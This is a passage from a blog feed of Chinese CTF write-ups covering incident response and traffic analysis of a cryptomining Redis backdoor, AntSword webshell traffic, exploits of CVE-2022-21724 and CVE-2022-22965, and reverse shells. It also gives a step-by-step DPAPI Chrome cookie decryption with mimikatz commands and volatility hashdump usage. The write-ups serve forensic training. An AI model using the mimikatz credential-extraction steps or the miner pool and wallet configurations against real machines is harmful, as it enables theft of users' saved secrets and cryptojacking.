alt="image-20240226204253452"></p><p>得到ip地址<code>192.168.160.158</code>  当然虚拟机的网络连接模式要选NAT模式 </p><p>xshell连接成功 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262045691.png" alt="image-20240226204537637"></p><p>使用xftp将文件系统中的文件全部下载下来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262046088.png" alt="image-20240226204652002"></p><p>然后使用D盾进行扫描 </p><pre><code>\etc\redis\redis-server</code></pre><p>这个文件里面存在后门 看一下文件结构 还是个linux可执行程序 那这个就是挖矿病毒的路径了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262119503.png" alt="image-20240226211924453"></p><p>进行md5加密</p><pre><code>6f72038a870f05cbf923633066e48881</code></pre><h3 id="2-4"><a href="#2-4" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271248631.png" alt="image-20240227124816577"></p><p>由第一题 我们可得挖矿病毒程序在<code>\etc\redis</code>文件夹下 那在同文件夹下一定还有关于挖矿病毒的文件</p><p>找到<code>redis.conf</code>配置文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271251198.png" alt="image-20240227125129155"></p><pre><code>这段代码看起来是关于加密货币挖矿的配置信息，可能是针对 XMRig 软件的配置。让我逐一解释：&quot;pools&quot;: [...]: 这是一个列表，包含了挖矿池的配置信息。&quot;algo&quot;: null: 这里应该指定挖矿所使用的算法，但是目前是空值，可能需要根据具体情况填写。&quot;coin&quot;: null: 指定挖矿的加密货币种类，同样是空值。&quot;url&quot;: &quot;donate.v2.xmrig.com:3333&quot;: 挖矿池的地址，通常包括主机名和端口号。&quot;user&quot;: &quot;YOUR_WALLET_ADDRESS&quot;: 这里需要填写你的数字货币钱包地址，挖矿所得的货币会发送到这个地址。&quot;pass&quot;: &quot;x&quot;: 密码，通常是 &#39;x&#39; 或者是空值。&quot;rig-id&quot;: null: 矿机的标识符，同样是空值。&quot;nicehash&quot;: false: 表示是否使用 NiceHash 挖矿，这里是 false，即不使用 NiceHash。&quot;keepalive&quot;: false: 是否保持挖矿连接活跃，这里是 false。&quot;enabled&quot;: true: 挖矿池是否启用，这里是 true。&quot;tls&quot;: false: 是否使用 TLS/SSL 连接，这里是 false。&quot;tls-fingerprint&quot;: null: TLS/SSL 指纹，同样是空值。&quot;daemon&quot;: false: 是否使用挖矿守护进程模式，这里是 false。&quot;socks5&quot;: null: SOCKS5 代理，同样是空值。&quot;self-select&quot;: null: 自选功能，为空值。&quot;submit-to-origin&quot;: false: 是否将挖矿结果提交到原始地址，这里是 false。</code></pre><p>很明显矿池域名是</p><pre><code>donate.v2.xmrig.com</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271300313.png" alt="image-20240227130018273"></p><pre><code>3fca20bb92d0ed67714e68704a0a4503</code></pre><h3 id="3-4"><a href="#3-4" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271300548.png" alt="image-20240227130039488"></p><p>查看服务器的历史命令</p><p>看到运行jar包之后生成了一个<code>nohup.log</code>日志文件 在<code>\home\app</code>文件夹下 在里面看到了很多shiro链 那就是shiro反序列化漏洞</p><pre><code>shirodeserialization3ee726cb32f87a15d22fe55fa04c4dcd</code></pre><h3 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271833436.png" alt="image-20240227183332371"></p><p>直接用last命令看一下登陆记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271835827.png" alt="image-20240227183517764"></p><p>这几个就是</p><pre><code>81.70.166.3c76b4b1a5e8c9e7751af4684c6a8b2c9</code></pre><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271835095.png" alt="image-20240227183555028"></p><p>查看nginx服务器的日志文件 </p><pre><code>cat \var\log\nginx\access.log</code></pre><p>直接拉到最后</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271858068.png" alt="image-20240227185804997"></p><pre><code>Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)mozilla/5.0(compatible;baiduspider/2.0;+http://www.baidu.com/search/spider.html)6ba8458f11f4044cce7a621c085bb3c6</code></pre><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271901846.png" alt="image-20240227190112787"></p><p>猜测是sshd软连接</p><p>直接搜一下</p><pre><code>history | grep ssh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271908952.png" alt="image-20240227190834907"></p><p>查看这个文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271909843.png" alt="image-20240227190903805"></p><p>UsePAM为YES的话就是通过ssh软连接进行权限维持</p><p>再看一下ssh</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271911412.png" alt="image-20240227191140366"></p><p>连接上了kali的ssh</p><pre><code>/root/.ssh/authorized_keysa1fa1b5aeb1f97340032971c342c4258</code></pre><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271912351.png" alt="image-20240227191218301"></p><p>上面提到的redis挖矿病毒也算 </p><pre><code>/lib/systemd/system/redis.service</code></pre><p>这个文件一直在开启redis文件进行自动挖矿</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271913573.png" alt="image-20240227191354528"></p><pre><code>b2c5af8ce08753894540331e5a947d35</code></pre><h2 id="SmallSword"><a href="#SmallSword" class="headerlink" title="SmallSword"></a>SmallSword</h2><h3 id="1-5"><a href="#1-5" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402192341144.png" alt="image-20240219234130980"></p><p>找到蚁剑连接部分的流量  解一下url编码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402201724005.png" alt="image-20240220172412934"></p><pre><code>6ea280898e404bfabd0ebb702327b19f</code></pre><p>看到<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0)</code> 这部分前面就是蚁剑连接的密码</p><pre><code>6ea280898e404bfabd0ebb702327b19f</code></pre><h3 id="2-5"><a href="#2-5" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202211103.png" alt="image-20240220221117025"></p><p>直接找蚁剑连接的流量包一个个解密看内容就行 这个没什么技巧</p><p>需要注意一点蚁剑流量在url编码之前会先进行一次base64加密 但是加密之后可能会在密文前添加不定字符 进行一个简单的免杀 这会使我们在解密的时候 如果不去掉这些额外字符解出来肯定会是乱码</p><p>这个冗余字符的长度我们可以观察蚁剑流量传输的代码 </p><p>下面是例子</p><pre><code>$p = base64_decode(substr($_POST[&quot;m0300de6257f67&quot;], 2));substr函数的作用是截取字符串中指定长度的字符语法是int substr(string str, int start , int length)   那么对于上面这一部分蚁剑流量 就可以理解为他从下标索引为2的字符(实际上就是第三个字符)开始截取 并进行base64解密</code></pre><p>那么对于这个流量 我们也可以找到相关的语句 发现他没有进行免杀 直接从头开始解base64</p><pre><code>$D=base64_decode($_POST[&quot;0x72b3f341e432&quot;]);</code></pre><p>解密142条流量包的数据 发现存在写入一个名为<code>hacker.txt</code>的文件的操作</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202333845.png" alt="image-20240220233301767"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202332884.png" alt="image-20240220233238792"></p><p>这部分就是攻击者留存的值</p><pre><code>ad6269b7-3ce2-4ae8-b97f-f259515e7a91 </code></pre><h3 id="3-5"><a href="#3-5" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202334167.png" alt="image-20240220233403097"></p><p>第130个数据包处进行解密 发现是读取了一个<code>huorong.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202354803.png" alt="image-20240220235426750"></p><p>同时导出http最大的文件也是这个包里面的 名为<code>info1.php</code> 提取出来看一下结构</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202357252.png" alt="image-20240220235729184"></p><p>删掉前面的<code>-&gt;|</code>  改名为<code>1.exe</code></p><p>用pyinstxtractor.py来解析一下 发现一个<code>2.pyc</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402210006772.png" alt="image-20240221000601564"></p><p>在线反编译一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402210009827.png" alt="image-20240221000937720"></p><p>会生成一个<code>test.jpg</code>图片 运行一下 但是需要改下宽高 直接梭了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402210016206.png" alt="image-20240221001658169"></p><h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><h3 id="1-6"><a href="#1-6" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402211137806.png" alt="image-20240221113750721"></p><p>观察整个流量包 很明显的爆破过程是先扫目录 扫到登陆目录在爆破用户名爆破用户密码  先筛选一波</p><pre><code>http &amp;&amp; ip.src == 172.31.0.2 &amp;&amp; ip.dst == 172.31.0.1 &amp;&amp; http.response.code == 200</code></pre><p>观察发现 当密码不对的时候 状态码是300</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212305686.png" alt="image-20240221230515587"></p><p>继续翻找 发现一个状态码为200的包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212305979.png" alt="image-20240221230540903"></p><p>追踪tcp流 找到账号和密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212306833.png" alt="image-20240221230608763"></p><pre><code>TMjpxFGQwD:123457</code></pre><h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>一种新的筛选方法 直接筛选状态码的内容</p><pre><code>tcp contains &quot;&#123;\&quot;errCode\&quot;:200&#125;&quot;</code></pre><p>注意双引号用\转义一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212353738.png" alt="image-20240221235343684"></p><h3 id="2-6"><a href="#2-6" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212353601.png" alt="image-20240221235355531"></p><p>大致了解一下越权漏洞 就是一种越过对特定资源读写的权限的漏洞 分为水平越权和垂直越权 水平就是同级别(权限)的用户 可以越权访问、修改或者删除的非法操作 垂直又分为向下越权和向上越权 </p><p>通俗来讲就是 当权限验证做的不好的时候 抓包之后修改url后面的用户对应的参数 就可以实现越权访问</p><p>观察发现 在密码爆破结束之后是第1585个包 userid&#x3D;2</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128129.png" alt="image-20240222234629544"></p><p>拉倒最后 发现userid变成了1  实现了越权漏洞利用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128877.png" alt="image-20240222234717512"></p><p>此时的cookie为</p><pre><code>accessToken=f412d3a0378d42439ee016b06ef3330c; zyplayertoken=f412d3a0378d42439ee016b06ef3330cQzw=; userid=1</code></pre><p>进行md5加密</p><pre><code>383c74db4e32513daaa1eeb1726d7255</code></pre><h3 id="3-6"><a href="#3-6" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128473.png" alt="image-20240222235256927"></p><p>没啥技巧 就是翻就完事了 或者同第一题筛选一下也可以</p><pre><code>tcp contains &quot;jdbc&quot; &amp;&amp; tcp contains &quot;username&quot; &amp;&amp; tcp contains &quot;passwd&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128607.png" alt="image-20240223000811948"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128790.png" alt="image-20240223000828576"></p><pre><code>zyplayer:1234567</code></pre><h3 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128407.png" alt="image-20240223000903469"></p><p>在使用jdbc漏洞读取了数据库的账号密码之后 在向下翻找数据包 在1603流的内容中看到了很明显的反弹shell的语句</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242110555.png" alt="image-20240224211033469"></p><p>可以找到这个文件的名字是<code>custom.dtd.xml</code> 那向前翻找一个包 也可以找到这个文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242111087.png" alt="image-20240224211100008"></p><p>直接搜一下这段 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242112639.png" alt="image-20240224211226582"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242113327.png" alt="image-20240224211343250"></p><p>可以找到漏洞编号为<code>CVE-2022-21724</code></p><pre><code>CVE-2022-21724:custom.dtd.xml</code></pre><h3 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251559151.png" alt="image-20240225155907092"></p><p> 看到第1611个流里面 在获取系统权限之后 使用curl命令 下载了fscan工具 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251606083.png" alt="image-20240225160616995"></p><pre><code>fscan</code></pre><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><h3 id="1-7"><a href="#1-7" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251608375.png" alt="image-20240225160808322"></p><p>这个其实很明显了 TCP协议的流量 第一个包是<code>192.168.246.1</code>向<code>192.168.246.28</code>发送SYN包 表示建立连接 那肯定<code>192.168.246.28</code>就是被入侵的主机ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251623622.png" alt="image-20240225162342568"></p><pre><code>192.168.246.28</code></pre><h3 id="2-7"><a href="#2-7" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251624590.png" alt="image-20240225162401549"></p><p>也是在追踪tcp的第一个流里面 看到了输入用户名密码成功登陆被入侵主机的记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251624897.png" alt="image-20240225162450792"></p><pre><code>youcannevergetthis</code></pre><h3 id="3-7"><a href="#3-7" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251626451.png" alt="image-20240225162627383"></p><p>看到在被入侵主机里面执行了<code>ls</code>命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251645704.png" alt="image-20240225164549663"></p><p>直接横着看就行 第二个是<code>Downloads</code> </p><h3 id="4-3"><a href="#4-3" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251653428.png" alt="image-20240225165326379"></p><p>看到被入侵主机中执行了<code>cat /etc/passwd</code>命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251654211.png" alt="image-20240225165437163"></p><p>那倒数第二个用户名就是<code>mysql</code></p><h2 id="server-save"><a href="#server-save" class="headerlink" title="server_save"></a>server_save</h2><h3 id="1-8"><a href="#1-8" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252028117.png" alt="image-20240225202807050"></p><p>类似与tcpdump4的做法 先找到进入终端的流 是108流 看到是先用python创建了一个交互式终端 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252059240.png" alt="image-20240225205912166"></p><p>向前翻 第106流是一个反弹shell的文件<code>bbbb.sh</code> 第107流就是执行这个反弹shell的码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252103418.png" alt="image-20240225210303379"></p><p>105流可以看到执行了传入cmd参数 内容是id 回显内容显示此时的用户是root 说明这个时候拿到了root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252106716.png" alt="image-20240225210619658"></p><p>那前面一个流 就是拿到root权限的方法</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252106999.png" alt="image-20240225210648923"></p><p>直接搜一下这句 就找到了CVE编号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252107153.png" alt="image-20240225210712105"></p><pre><code>CVE-2022-22965</code></pre><h3 id="2-8"><a href="#2-8" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252108936.png" alt="image-20240225210811880"></p><p>这个反弹shell前面已经分析过了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252108604.png" alt="image-20240225210303379"></p><pre><code>192.168.43.128:2333</code></pre><h3 id="3-8"><a href="#3-8" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252109883.png" alt="image-20240225210912839"></p><p>这个就是翻do文件夹里面的文件系统 在<code>\home\guests</code>文件夹下找到一个<code>main</code>文件夹 放到沙箱里面分析一下 就是个elf可执行程序病毒文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252132078.png" alt="image-20240225213247982"></p><pre><code>main</code></pre><h3 id="4-4"><a href="#4-4" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252133969.png" alt="image-20240225213302908"></p><p>直接在沙箱里面看分析结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252135563.png" alt="image-20240225213502521"></p><p>添加了<code>ll</code>用户 密码明文为<code>123456</code></p><pre><code>ll:123456</code></pre><h3 id="5-2"><a href="#5-2" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252135108.png" alt="image-20240225213547063"></p><p>在沙箱的异常行为分析中 看到这个病毒文件创建了一个隐藏文件或者系统文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252137942.png" alt="image-20240225213714896"></p><p>我们看一下这个<code>.log.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252137785.png" alt="image-20240225213736742"></p><p>那就是这个ip了</p><pre><code>172.105.202.239</code></pre><h3 id="6-1"><a href="#6-1" class="headerlink" title="6"></a>6</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252138596.png" alt="image-20240225213800550"></p><p>两个文件的话 那应该就是<code>\home\guests\.idea</code>下的两个文件了 看创建日期也能判断 这是在main运行之后产生的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252140318.png" alt="image-20240225214056282"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252140884.png" alt="image-20240225214031850"></p><pre><code>lolMiner、mine_doge.sh</code></pre><h3 id="7、8"><a href="#7、8" class="headerlink" title="7、8"></a>7、8</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252141823.png" alt="image-20240225214131774"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252142603.png" alt="image-20240225214216553"></p><p>都在<code>mine_doge.sh</code>这个文件夹下了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252142041.png" alt="image-20240225214241997"></p><pre><code>POOL=doge.millpools.cc:5567WALLET=DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9.lolMinerWorker</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023陇剑杯初赛&quot;&gt;&lt;a href=&quot;#2023陇剑杯初赛&quot; class=&quot;headerlink&quot; title=&quot;2023陇剑杯初赛&quot;&gt;&lt;/a&gt;2023陇剑杯初赛&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;陇剑杯初赛的时候正好赶上我在带训 实在不好请假 遗憾错过流量分析杯 </summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="流量分析" scheme="http://w3nx1z1.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    <category term="应急响应" scheme="http://w3nx1z1.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>2024古剑山</title>
    <link href="http://w3nx1z1.github.io/2024/02/08/2023%E5%8F%A4%E5%89%91%E5%B1%B1/"/>
    <id>http://w3nx1z1.github.io/2024/02/08/2023%E5%8F%A4%E5%89%91%E5%B1%B1/</id>
    <published>2024-02-08T14:49:34.267Z</published>
    <updated>2024-02-28T07:10:08.060Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023古剑山"><a href="#2023古剑山" class="headerlink" title="2023古剑山"></a>2023古剑山</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="数独-gaps拼图"><a href="#数独-gaps拼图" class="headerlink" title="数独(gaps拼图)"></a>数独(gaps拼图)</h3><p>给了一个image.png和sudoku.png 先把数独解了一下 得到下面的结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401311803025.png" alt="image-20240131180350976"></p><p>但是不知道有什么用 再看一下image.png 需要重新拼一下图 就用gaps就行了</p><p>原图像的大小是630x630 小图片是9x9 因此使用的size参数就是70</p><pre><code>gaps --image=image.png --generations=50 --populations=200 --size=70 --save </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401311810545.jpg" alt="image_solution1"></p><p>这里我当时是以为数独有什么用 把解好的数独都写在原图片之后再拼的 实际上我们拼完之后直接按照从上到下 从左到右的顺序读flag就行</p><h3 id="幸运饼干-DPAPI技术-Chrome数据加密"><a href="#幸运饼干-DPAPI技术-Chrome数据加密" class="headerlink" title="幸运饼干(DPAPI技术 Chrome数据加密)"></a>幸运饼干(DPAPI技术 Chrome数据加密)</h3><p>附件是一个hint.jpg和flag.zip flag.zip里面有个和hint.jpg大小一样的文件 直接明文攻击 先将hint.jpg压缩为hint.zip 在ARCHPR里面进行明文攻击</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401312201871.png" alt="image-20240131211749661"></p><p>得到密码</p><pre><code>sv@1v3z</code></pre><p>解压压缩包 得到一个压缩包 一个admin.txt和Cookie文件 先看一下Cookie文件格式 用file命令 是个sql数据库文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401312237874.png" alt="image-20240131223747841"></p><p>admin.txt里面是使用mimikatz对计算机进行分析的记录  看到里面有一个NTML密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401312244139.png" alt="image-20240131224435108"></p><p>解一下 密码是<code>54231</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401312311633.png" alt="image-20240131231126598"></p><h4 id="先看一下前置知识"><a href="#先看一下前置知识" class="headerlink" title="先看一下前置知识"></a>先看一下前置知识</h4><p>DPAPI，Data Protection Application Programming Interface，是Windows系统的一个数据保护接口，它本质上使用了Windows通过用户自己登录（sids，登录密码等），以及域登录后的一些数据生成的密钥，并且使用内置的算法，对用户指定的数据进行加密。通常Windows上的浏览器历史数据，邮件加密，wifi密码等等都会以这种方式进行数据加密。</p><p>Chrome使用DPAPI保存了我们的登录密码和cookie值</p><p>用户使用Chrome访问网站进行登录时，可以选择是否保存密码。当选择保存密码时，Chrome先将密码进行加密，再保存在SQLite数据库文件中，数据库文件路径位于：</p><pre><code>%LocalAppData%\Google\Chrome\User Data\Default\Login Data</code></pre><p>同上，保存Cookie时，数据库文件路径为：</p><pre><code>%LocalAppData%\Google\Chrome\User Data\Default\Cookies</code></pre><p>存储的cookie值被加密为DPAPI blob来进行保护；我们可以通过使用Mimikatz这个工具来对Chrome中的SQLite数据库进行解析：</p><pre><code>mimikatz dpapi::chrome /in:&#39;%LocalAppData%\Google\Chrome\User Data\Default\Cookies&#39;</code></pre><p>解密DPAPI blob用到的相关概念：</p><pre><code>DPAPI blob：一段密文，可以使用Master Key对其解密Master Key：64字节，用于解密DPAPI blob；使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中Master Key file：二进制文件，可以使用用户登录密码对其解密，得到Master Key</code></pre><p>对采用DPAPI技术加密的数据进行解密，需要获取当前操作系统登录用户对应的 Master Key，而获取 MasterKey 需要知道用户名、密码以及对应的SID，然后利用这些数据生成一个 blob 加密过程中使用的 MasterKey，从而对目标blob进行解密</p><p>大致的过程是</p><pre><code>dpapi::masterkey /in:&#123;masterkeyfile&#125; /sid:&#123;sid&#125; /password:&#123;password&#125; /protected</code></pre><p>得到masterkey之后 使用masterkey(原key值或者sha1加密值都可以)解密Cookies&#x2F;logindata</p><pre><code>dpapi::chrome /in:&#123;Cookies&#125; /masterkey:&#123;masterkey&#125; /unprotect</code></pre><p>这样就可以得到Cookies的加密数据的hex值或者直接得到明文</p><p>toto✌🏻的这篇文章写的很全面 狠狠膜拜了</p><p><a href="https://blog.csdn.net/jyttttttt/article/details/134972038?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170670869216800192291692%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=170670869216800192291692&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-134972038-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=mimikatz%20blob%E8%A7%A3%E5%AF%86&spm=1018.2226.3001.4187">电子取证中Chrome各版本解密Cookies、LoginData账号密码、历史记录</a></p><p>我们用sqlcipher打开Cooike这个sql数据库文件 看到有一个encrypted_value 提示是blob 那就是一个利用DPAPI技术加密的Chrome数据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402010011268.png" alt="image-20240201001135197"></p><p>我们结合前置知识 现在我们有了用户名 密码 在flag.zip解压后的文件里面还有一个压缩包 文件名就是SID 压缩包里面的文件应该就是masterkey文件</p><pre><code>S-1-5-21-726299542-2485387390-1117163988-1001</code></pre><p>有了这些我们就可以得到masterkey</p><pre><code>dpapi::masterkey /in:.\S-1-5-21-726299542-2485387390-1117163988-1001\e5f8e386-7041-4f16-b02d-304c71040126 /sid:S-1-5-21-726299542-2485387390-1117163988-1001 /password:54231 /protected </code></pre><p><font color='red'>这个地方遇到了几个问题 一是Cookies文件解压之后在文件夹里面是看不到的 但是用vscode打开文件夹作为工作区是可以看到的 二是注意一下最好是将文件夹或者Cookies文件直接放在mimikatz程序的文件夹中 放在其他位置有可能不出结果</font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402011958520.png" alt="image-20240201195817441"></p><p> 下面就是用masterkey解密Cookies文件</p><pre><code>dpapi::chrome /in:.\Cookies /masterkey:7a4d2ffbb42d0a1ab46f0351260aef16cae699e03e9d6514b3bf10e2977c5d228fda4a48e39b7b8a06a443c39653c2a3c3656596e7edc84e1c9682511c8343ac /unprotect</code></pre><p>直接得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402011959283.png" alt="image-20240201195956233"></p><p>另 在学习姿势的时候 还看到了一些将Cookies识别分割为数据库的方法</p><pre><code>binwalk Cookiesdd if=Cookies bs=1 skip=0 of=1.db</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012017942.png" alt="image-20240201201726904"></p><h3 id="同类型的题：-红明谷CTF-2022-MissingFile"><a href="#同类型的题：-红明谷CTF-2022-MissingFile" class="headerlink" title="同类型的题：[红明谷CTF 2022]MissingFile"></a>同类型的题：[红明谷CTF 2022]MissingFile</h3><p><font color='red'>我们再来看一下这道类似的题 主要是学习一下面对这种题的思路和解题步骤 </font></p><p>附件是一个内存镜像文件<code>memory</code> 题目描述为</p><pre><code>好像被攻击者入侵了，但是赶到现场的时候，已经只剩下一个空的文件夹了，快照能找到攻击者留下的秘密吗？</code></pre><p>首先看一下被入侵的痕迹 </p><pre><code>.\volatility.exe -f E:\Desktop\比赛\古剑山\misc\[红明谷CTF2022]MissingFile\memory --profile=Win7SP1x86_23418 hashdump</code></pre><p>可以看到有一个link3用户 还有一个NewGuest用户 既然是被入侵 那NewGuest应该就是攻击者入侵之后创建的账户 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012032769.png" alt="image-20240201203208646"></p><p>NewGuest用户的密码还是个可破解的哈希值 <code>123456</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012059018.png" alt="image-20240201205917974"></p><p>再看一下攻击用户进行的文件操作  看到使用了mimikatz的记录</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\古剑山\misc\[红明谷CTF2022]MissingFile\memory --profile=Win7SP1x86_23418 filescan | findstr &quot;NewGuest&quot;</code></pre><p><img 